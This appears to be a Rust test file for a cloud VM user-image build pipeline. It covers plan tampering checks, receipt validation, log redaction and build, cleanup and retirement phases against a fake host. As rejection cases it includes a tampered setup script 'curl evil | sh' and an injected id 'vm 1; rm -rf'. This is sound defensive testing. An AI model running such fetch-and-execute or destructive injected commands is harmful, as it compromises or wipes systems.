//! Identity, plan and receipt rules, and the Boxd phase logic against an
//! in-memory provider that records every effect.
use super::boxd::{BoxdUserImages, ImageHost};
use super::*;
use crate::managed_bases::bootstrap::InitialRuntimeBootstrap;
use crate::providers::{
    ExecResult, Machine, MachineState, ProviderError,
    boxd::{Snapshot, SnapshotCapture, SnapshotState},
};
use serde_json::json;
use std::{
    collections::HashMap,
    sync::{Arc, Mutex},
};

pub(super) fn bootstrap() -> InitialRuntimeBootstrap {
    InitialRuntimeBootstrap {
        version: 1,
        mode: "stopped-memory-snapshot-v1".into(),
        runtime_sha256: "a".repeat(64),
        supervisor_sha256: "b".repeat(64),
        service_sha256: "c".repeat(64),
        manifest_sha256: "d".repeat(64),
        helper_sha256: "e".repeat(64),
        runtime_update_helper_sha256: None,
    }
}

pub(super) fn plan(script: &str) -> BuildPlan {
    let recipe = MachineRecipe {
        setup_script: script.into(),
        ..Default::default()
    };
    BuildPlan {
        version: 1,
        image_id: format!("uimg_{}", "1".repeat(32)),
        identity: UserImageIdentity {
            version: 1,
            owner_id: "user-alice".into(),
            provider: ProviderId::Boxd,
            architecture: "x86_64".into(),
            base_release_id: "base-v1".into(),
            base_artifact_id: "base-snapshot".into(),
            base_artifact_version: "3".into(),
            base_runtime_sha256: "a".repeat(64),
            recipe_digest: image_digest(&recipe).unwrap(),
        },
        setup_script: script.into(),
        setup_timeout_seconds: recipe.setup_timeout_seconds,
        initial_runtime_bootstrap: bootstrap(),
    }
}

#[test]
fn only_the_setup_script_is_in_the_image() {
    let mut recipe = MachineRecipe::default();
    assert_eq!(image_digest(&recipe), None);
    recipe.instructions = "Prefer pnpm".into();
    recipe
        .files
        .push(zuse_protocol::cloud_computers::MachineFile {
            path: ".gitconfig".into(),
            content: "[user]".into(),
        });
    assert_eq!(image_digest(&recipe), None, "no script, no image");
    recipe.setup_script = "npm i -g pnpm".into();
    let digest = image_digest(&recipe).unwrap();
    recipe.instructions = "Something else".into();
    recipe
        .skills
        .push(zuse_protocol::cloud_computers::MachineSkill {
            name: "review".into(),
            content: "# Review".into(),
        });
    assert_eq!(
        image_digest(&recipe).unwrap(),
        digest,
        "per-chat content never rebuilds"
    );
    recipe.setup_timeout_seconds = 600;
    assert_ne!(image_digest(&recipe).unwrap(), digest);
    recipe.setup_script = "   \n".into();
    assert_eq!(image_digest(&recipe), None);
}

#[test]
fn identity_is_per_account_provider_base_and_script() {
    let original = plan("npm i -g pnpm").identity;
    let key = original.key().unwrap();
    for changed in [
        UserImageIdentity {
            owner_id: "organization:team".into(),
            ..original.clone()
        },
        UserImageIdentity {
            provider: ProviderId::Boat,
            ..original.clone()
        },
        UserImageIdentity {
            base_release_id: "base-v2".into(),
            ..original.clone()
        },
        UserImageIdentity {
            base_artifact_version: "4".into(),
            ..original.clone()
        },
        UserImageIdentity {
            base_runtime_sha256: "f".repeat(64),
            ..original.clone()
        },
        UserImageIdentity {
            recipe_digest: "f".repeat(64),
            ..original.clone()
        },
    ] {
        assert_ne!(changed.key().unwrap(), key);
    }
    let encoded = serde_json::to_value(&original).unwrap();
    for absent in [
        "projectId",
        "repositoryIdentity",
        "sourceCommit",
        "agentConnectionId",
    ] {
        assert!(encoded.get(absent).is_none());
    }
    assert!(
        UserImageIdentity {
            base_runtime_sha256: "A".repeat(64),
            ..original
        }
        .key()
        .is_err()
    );
}

#[test]
fn plan_binds_script_timeout_and_base_runtime() {
    let good = plan("apt-get install -y ripgrep");
    good.validate().unwrap();
    let mut tampered = good.clone();
    tampered.setup_script = "curl evil | sh".into();
    assert!(tampered.validate().is_err());
    let mut tampered = good.clone();
    tampered.setup_timeout_seconds = 3600;
    assert!(tampered.validate().is_err());
    let mut tampered = good.clone();
    tampered.initial_runtime_bootstrap.runtime_sha256 = "f".repeat(64);
    assert!(tampered.validate().is_err());
    let mut tampered = good.clone();
    tampered.image_id = "uimg_../../x".into();
    assert!(tampered.validate().is_err());
    let (builder, verifier, snapshot) = good.names();
    assert_eq!(builder, format!("ui-b-{}", "1".repeat(32)));
    assert!(verifier.starts_with("ui-v-") && snapshot.starts_with("ui-s-"));
    assert!(builder.len() <= 63);
}

#[test]
fn receipts_hold_only_ids_and_flags() {
    validate_resources(&json!({"builderId":"vm-1","artifactVersion":"7","builderAbsent":true}))
        .unwrap();
    for bad in [
        json!({"stdout":"anything"}),
        json!({"builderId":"vm 1; rm -rf"}),
        json!({"builderAbsent":"yes"}),
        json!([]),
    ] {
        assert!(validate_resources(&bad).is_err());
    }
}

#[test]
fn log_excerpt_is_bounded_and_redacted() {
    let raw = format!(
        "{}\nexport GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123\nfetched ghp_abcdefghijklmnopqrstuvwxyz0123 ok\nAuthorization: Bearer abc\nE: Unable to locate package nope\x1b[0m\n",
        "x".repeat(10_000)
    );
    let excerpt = log_excerpt(&raw);
    assert!(excerpt.len() <= LOG_EXCERPT);
    assert!(!excerpt.contains("ghp_"));
    assert!(!excerpt.contains("Bearer abc"));
    assert!(excerpt.contains("Unable to locate package nope"));
    assert!(!excerpt.contains('\x1b'));
}

/// What the guest answers, per build.
#[derive(Clone)]
pub(super) struct Guest {
    pub setup_exit: i64,
    pub setup_log: String,
    pub setup_polls_before_exit: usize,
    pub sanitize_error: Option<&'static str>,
    pub check_clean: bool,
    pub fresh_boot_ok: bool,
    pub snapshot_polls_before_ready: usize,
}
impl Default for Guest {
    fn default() -> Self {
        Self {
            setup_exit: 0,
            setup_log: "installed\n".into(),
            setup_polls_before_exit: 1,
            sanitize_error: None,
            check_clean: true,
            fresh_boot_ok: true,
            snapshot_polls_before_ready: 1,
        }
    }
}

#[derive(Default)]
pub(super) struct HostState {
    pub machines: HashMap<String, (Machine, String)>,
    pub snapshots: HashMap<String, (Snapshot, String)>,
    pub creates: usize,
    pub captures: usize,
    pub destroys: usize,
    pub snapshot_deletes: usize,
    pub setup_launches: usize,
    pub setup_polls: usize,
    pub uploads: Vec<String>,
    pub commands: Vec<String>,
    /// Fail the next call whose name matches, after applying its effect.
    pub lose_reply: Option<&'static str>,
    pub guest: Guest,
}

#[derive(Clone, Default)]
pub(super) struct FakeHost(pub Arc<Mutex<HostState>>);

impl FakeHost {
    pub fn new() -> Self {
        let host = Self::default();
        host.0.lock().unwrap().snapshots.insert(
            "base-snapshot".into(),
            (
                snapshot("base-snapshot", "base-snapshot", 3, SnapshotState::Ready),
                "base".into(),
            ),
        );
        host
    }
    fn lost(state: &mut HostState, name: &'static str) -> bool {
        if state.lose_reply == Some(name) {
            state.lose_reply = None;
            true
        } else {
            false
        }
    }
}
fn snapshot(id: &str, name: &str, version: u64, state: SnapshotState) -> Snapshot {
    Snapshot {
        id: id.into(),
        name: name.into(),
        version,
        state,
        size_bytes: 0,
        vcpu: 1,
        memory_bytes: 0,
        created_at_ms: 0,
        updated_at_ms: 0,
    }
}
fn helper_args(command: &str) -> Option<Vec<String>> {
    let quoted = super::boxd::quote(GUEST_HELPER);
    let (_, tail) = command.split_once(&quoted)?;
    Some(
        tail.split(" '")
            .filter(|s| !s.trim().is_empty())
            .map(|s| s.trim().trim_end_matches('\'').to_owned())
            .collect(),
    )
}
fn ok(value: Value) -> Result<ExecResult, ProviderError> {
    Ok(ExecResult {
        stdout: serde_json::to_vec(&value).unwrap(),
        stderr: vec![],
        exit_code: 0,
    })
}

#[async_trait::async_trait]
impl ImageHost for FakeHost {
    async fn inspect(&self, reference: &str) -> Result<Option<Machine>, ProviderError> {
        let state = self.0.lock().unwrap();
        Ok(state
            .machines
            .values()
            .find(|(m, _)| m.id == reference || m.name == reference)
            .map(|(m, _)| m.clone()))
    }
    async fn create_from_snapshot(
        &self,
        snapshot: &str,
        name: &str,
    ) -> Result<Machine, ProviderError> {
        let mut state = self.0.lock().unwrap();
        assert!(
            state.snapshots.contains_key(snapshot),
            "source snapshot exists"
        );
        assert!(
            !state.machines.values().any(|(m, _)| m.name == name),
            "never a second create"
        );
        state.creates += 1;
        let machine = Machine {
            id: format!("vm-{}", state.creates),
            name: name.into(),
            state: MachineState::Running,
            vcpu: None,
            memory_bytes: None,
        };
        state
            .machines
            .insert(machine.id.clone(), (machine.clone(), snapshot.into()));
        if Self::lost(&mut state, "create") {
            return Err(ProviderError::OutcomeUnknown);
        }
        Ok(machine)
    }
    async fn verify_snapshot_source(
        &self,
        machine: &str,
        snapshot: &str,
        _: u64,
    ) -> Result<(), ProviderError> {
        let state = self.0.lock().unwrap();
        match state.machines.get(machine) {
            Some((_, source)) if source == snapshot => Ok(()),
            _ => Err(ProviderError::Rejected),
        }
    }
    async fn verify_initial_snapshot_source(
        &self,
        machine: &str,
        artifact: &str,
        _: &str,
    ) -> Result<(), ProviderError> {
        self.verify_snapshot_source(machine, artifact, 1).await
    }
    async fn exec(&self, machine: &str, command: &str) -> Result<ExecResult, ProviderError> {
        let mut state = self.0.lock().unwrap();
        assert!(state.machines.contains_key(machine));
        state.commands.push(command.chars().take(80).collect());
        let guest = state.guest.clone();
        if command.contains("base64.b64decode(d)") {
            // A file written as root through exec: record it like an upload.
            use base64::Engine;
            let mut parts = command.rsplitn(4, ' ');
            let data = parts.next().unwrap().trim_matches('\'');
            let mode = parts.next().unwrap();
            let path = parts.next().unwrap().trim_matches('\'');
            let data = base64::engine::general_purpose::STANDARD
                .decode(data)
                .unwrap();
            assert!(!String::from_utf8_lossy(&data).contains("secret-value"));
            if mode == "w" {
                state.uploads.push(path.into());
            }
            return Ok(ExecResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
            });
        }
        let Some(args) = helper_args(command) else {
            if command.starts_with("sudo -n /usr/bin/python3 -I -B -c") {
                // Fresh boot through the fixed-path loader: echo the request.
                use base64::Engine;
                let body = command.rsplit(' ').next().unwrap().trim_matches('\'');
                let request: Value = serde_json::from_slice(
                    &base64::engine::general_purpose::STANDARD
                        .decode(body)
                        .unwrap(),
                )
                .unwrap();
                let parsed: crate::managed_bases::bootstrap::Request =
                    serde_json::from_value(request.clone()).unwrap();
                if !guest.fresh_boot_ok {
                    return Ok(ExecResult {
                        stdout: vec![],
                        stderr: vec![],
                        exit_code: 3,
                    });
                }
                let mut reply = request;
                reply["status"] = json!("ready");
                reply["requestSha256"] = json!(parsed.digest().unwrap());
                reply["unitStartSubmitted"] = json!(true);
                reply["resident"] = json!({"ipcVerified":true,"unbound":true,"childAlive":false,"recoveryAlive":false,"residentPid":42,"residentStartTicks":7,"bootNonceSha256":"f".repeat(64)});
                return ok(reply);
            }
            return Ok(ExecResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
            });
        };
        let reply = match args[0].as_str() {
            "pins" => json!({"version":1,"pinsVerified":true}),
            "setup-status" => {
                if state.setup_launches == 0 {
                    json!({"version":1,"state":"not-started"})
                } else {
                    state.setup_polls += 1;
                    if state.setup_polls > guest.setup_polls_before_exit {
                        json!({"version":1,"state":"exited","exitCode":guest.setup_exit,"log":guest.setup_log})
                    } else {
                        json!({"version":1,"state":"running"})
                    }
                }
            }
            "setup-start" => {
                assert_eq!(args[1], "1800");
                if state.setup_launches == 0 {
                    state.setup_launches += 1;
                }
                if Self::lost(&mut state, "setup-start") {
                    return Err(ProviderError::OutcomeUnknown);
                }
                json!({"version":1,"state":"running"})
            }
            "sanitize" => match guest.sanitize_error {
                Some(code) => json!({"version":1,"error":code}),
                None => {
                    json!({"version":1,"sanitized":true,"pinsVerified":true,"runtimeStopped":true,"credentialsRemoved":true,"historyRemoved":true,"taskDataAbsent":true,"userProcessesStopped":true})
                }
            },
            "check" => {
                if guest.check_clean {
                    json!({"version":1,"clean":true,"pinsVerified":true})
                } else {
                    json!({"version":1,"error":"user_image_not_clean"})
                }
            }
            other => panic!("unexpected helper command {other}"),
        };
        ok(reply)
    }
    async fn upload(&self, machine: &str, path: &str, data: &[u8]) -> Result<(), ProviderError> {
        let mut state = self.0.lock().unwrap();
        assert!(state.machines.contains_key(machine));
        assert!(!String::from_utf8_lossy(data).contains("secret-value"));
        state.uploads.push(path.into());
        Ok(())
    }
    async fn destroy(&self, machine: &str) -> Result<(), ProviderError> {
        let mut state = self.0.lock().unwrap();
        state.destroys += 1;
        state.machines.remove(machine);
        if Self::lost(&mut state, "destroy") {
            return Err(ProviderError::OutcomeUnknown);
        }
        Ok(())
    }
    async fn create_snapshot(
        &self,
        machine: &str,
        name: &str,
    ) -> Result<SnapshotCapture, ProviderError> {
        let mut state = self.0.lock().unwrap();
        assert!(state.machines.contains_key(machine));
        assert!(
            !state.snapshots.values().any(|(s, _)| s.name == name),
            "never a second capture"
        );
        state.captures += 1;
        let id = format!("snap-{}", state.captures);
        state.snapshots.insert(
            id.clone(),
            (
                snapshot(&id, name, 1, SnapshotState::Pending),
                machine.into(),
            ),
        );
        if Self::lost(&mut state, "capture") {
            return Err(ProviderError::OutcomeUnknown);
        }
        Ok(SnapshotCapture {
            id,
            name: name.into(),
            version: 1,
            state: SnapshotState::Pending,
        })
    }
    async fn inspect_snapshot(&self, reference: &str) -> Result<Option<Snapshot>, ProviderError> {
        let mut state = self.0.lock().unwrap();
        let polls = state.guest.snapshot_polls_before_ready;
        let found = state
            .snapshots
            .values_mut()
            .find(|(s, _)| s.id == reference || s.name == reference);
        Ok(found.map(|(s, _)| {
            if s.state == SnapshotState::Pending {
                if s.size_bytes as usize >= polls {
                    s.state = SnapshotState::Ready;
                } else {
                    s.size_bytes += 1;
                }
            }
            s.clone()
        }))
    }
    async fn delete_snapshot(&self, reference: &str) -> Result<(), ProviderError> {
        let mut state = self.0.lock().unwrap();
        assert_ne!(
            reference, "base-snapshot",
            "the managed base is never deleted"
        );
        state.snapshot_deletes += 1;
        state
            .snapshots
            .retain(|_, (s, _)| s.id != reference && s.name != reference);
        Ok(())
    }
}

/// Drive the adapter alone the way the worker does: one phase at a time,
/// receipts carried forward, Reconcile after a lost reply.
pub(super) async fn drive(
    backend: &BoxdUserImages,
    plan: &BuildPlan,
    mut phase: String,
) -> (String, Value, Option<&'static str>) {
    let mut resources = json!({"effects":{}});
    for _ in 0..64 {
        let requested = resources["effects"][&phase]["requested"] == true;
        resources["effects"][&phase] = json!({"requested":true});
        let build = Build {
            image_id: plan.image_id.clone(),
            owner_id: plan.owner(),
            plan: plan.clone(),
            phase: phase.clone(),
            resources: resources.clone(),
            artifact_id: resources["provider"]["artifactId"]
                .as_str()
                .map(str::to_owned),
        };
        let mode = if requested {
            StepMode::Reconcile
        } else {
            StepMode::Begin
        };
        match backend.step(&build, mode).await {
            Err(_) => continue,
            Ok(Step::Pending(v)) => {
                validate_resources(&v).unwrap();
                resources["provider"] = v;
            }
            Ok(Step::Advance {
                phase: next,
                resources: v,
            }) => {
                validate_resources(&v).unwrap();
                assert_eq!(next_phase(&phase), Some(next.as_str()));
                resources["provider"] = v;
                if next == "complete" || next == "retired" {
                    return (next, resources, None);
                }
                phase = next;
            }
            Ok(Step::Ready {
                artifact_id,
                resources: v,
                ..
            }) => {
                assert_eq!(phase, "publish");
                assert_eq!(v["artifactId"], artifact_id.as_str());
                resources["provider"] = v;
                return ("ready".into(), resources, None);
            }
            Ok(Step::Failed {
                code, resources: v, ..
            }) => {
                resources["provider"] = v;
                return (phase, resources, Some(code));
            }
        }
    }
    panic!("build did not settle");
}

#[tokio::test]
async fn boxd_build_runs_setup_once_verifies_a_second_boot_and_leaves_no_machines() {
    let host = FakeHost::new();
    host.0.lock().unwrap().lose_reply = Some("create");
    let backend = BoxdUserImages::new(Arc::new(host.clone()));
    let plan = plan("npm i -g pnpm");
    assert_eq!(
        backend
            .base_version(ProviderId::Boxd, "base-snapshot")
            .await
            .unwrap()
            .as_deref(),
        Some("3")
    );
    assert_eq!(
        backend
            .base_version(ProviderId::Boxd, "missing")
            .await
            .unwrap(),
        None
    );
    let (state, resources, failure) = drive(&backend, &plan, "allocate".into()).await;
    assert_eq!((state.as_str(), failure), ("ready", None));
    let state = host.0.lock().unwrap();
    // Builder and verifier: one create each despite the lost create reply.
    assert_eq!(state.creates, 2);
    assert_eq!(state.setup_launches, 1);
    assert_eq!(state.captures, 1);
    assert!(state.machines.is_empty(), "builder and verifier are gone");
    assert_eq!(resources["provider"]["builderAbsent"], true);
    assert_eq!(resources["provider"]["verifierAbsent"], true);
    assert!(
        state
            .uploads
            .iter()
            .all(|p| p.starts_with("/opt/zuse/user-image/"))
    );
    // The verifier came from the captured snapshot, not the base.
    let artifact = resources["provider"]["artifactId"].as_str().unwrap();
    assert!(state.snapshots.contains_key(artifact));
}

#[tokio::test]
async fn boxd_failed_setup_reports_log_and_cleanup_deletes_everything_it_made() {
    let host = FakeHost::new();
    host.0.lock().unwrap().guest.setup_exit = 100;
    let backend = BoxdUserImages::new(Arc::new(host.clone()));
    let plan = plan("apt-get install -y nope");
    let (phase, resources, failure) = drive(&backend, &plan, "allocate".into()).await;
    assert_eq!(
        (phase.as_str(), failure),
        ("setup", Some("user_image_setup_failed"))
    );
    let mut build = Build {
        image_id: plan.image_id.clone(),
        owner_id: plan.owner(),
        plan: plan.clone(),
        phase: "cleanup".into(),
        resources,
        artifact_id: None,
    };
    let mut settled = false;
    for _ in 0..8 {
        match backend.step(&build, StepMode::Begin).await.unwrap() {
            Step::Pending(v) => build.resources["provider"] = v,
            Step::Advance { phase, resources } => {
                assert_eq!(phase, "complete");
                assert_eq!(resources["unpublishedArtifactAbsent"], true);
                settled = true;
                break;
            }
            _ => panic!("cleanup never fails"),
        }
    }
    assert!(settled);
    let state = host.0.lock().unwrap();
    assert!(state.machines.is_empty());
    assert_eq!(state.snapshots.len(), 1, "only the managed base remains");
}

#[tokio::test]
async fn boxd_rejects_images_that_changed_the_runtime_or_leaked_state() {
    for (guest, expected) in [
        (
            Guest {
                sanitize_error: Some("user_image_pinned_file_changed"),
                check_clean: false,
                ..Default::default()
            },
            ("sanitize", "user_image_runtime_files_changed"),
        ),
        (
            Guest {
                sanitize_error: Some("user_image_runtime_started"),
                check_clean: false,
                ..Default::default()
            },
            ("sanitize", "user_image_runtime_started"),
        ),
        (
            Guest {
                setup_exit: 124,
                ..Default::default()
            },
            ("setup", "user_image_setup_timeout"),
        ),
        (
            Guest {
                fresh_boot_ok: false,
                ..Default::default()
            },
            ("verify", "user_image_fresh_boot_rejected"),
        ),
    ] {
        let host = FakeHost::new();
        host.0.lock().unwrap().guest = guest;
        let backend = BoxdUserImages::new(Arc::new(host.clone()));
        let (phase, _, failure) = drive(&backend, &plan("x"), "allocate".into()).await;
        assert_eq!((phase.as_str(), failure), (expected.0, Some(expected.1)));
    }
}

#[tokio::test]
async fn boxd_lost_setup_launch_is_reconciled_without_running_the_script_twice() {
    let host = FakeHost::new();
    host.0.lock().unwrap().lose_reply = Some("setup-start");
    let backend = BoxdUserImages::new(Arc::new(host.clone()));
    let (state, _, failure) = drive(&backend, &plan("x"), "allocate".into()).await;
    assert_eq!((state.as_str(), failure), ("ready", None));
    assert_eq!(host.0.lock().unwrap().setup_launches, 1);
}

#[tokio::test]
async fn boxd_retirement_deletes_only_the_published_snapshot() {
    let host = FakeHost::new();
    let backend = BoxdUserImages::new(Arc::new(host.clone()));
    let plan = plan("x");
    let (_, resources, _) = drive(&backend, &plan, "allocate".into()).await;
    let artifact = resources["provider"]["artifactId"]
        .as_str()
        .unwrap()
        .to_owned();
    let mut build = Build {
        image_id: plan.image_id.clone(),
        owner_id: plan.owner(),
        plan: plan.clone(),
        phase: "retire".into(),
        resources: json!({"effects":{}}),
        artifact_id: Some(artifact.clone()),
    };
    loop {
        match backend.step(&build, StepMode::Begin).await.unwrap() {
            Step::Pending(v) => build.resources["provider"] = v,
            Step::Advance { phase, resources } => {
                assert_eq!(phase, "retired");
                assert_eq!(resources["artifactAbsent"], true);
                break;
            }
            _ => panic!("retirement only retries"),
        }
    }
    let state = host.0.lock().unwrap();
    assert!(!state.snapshots.contains_key(&artifact));
    assert!(state.snapshots.contains_key("base-snapshot"));
}
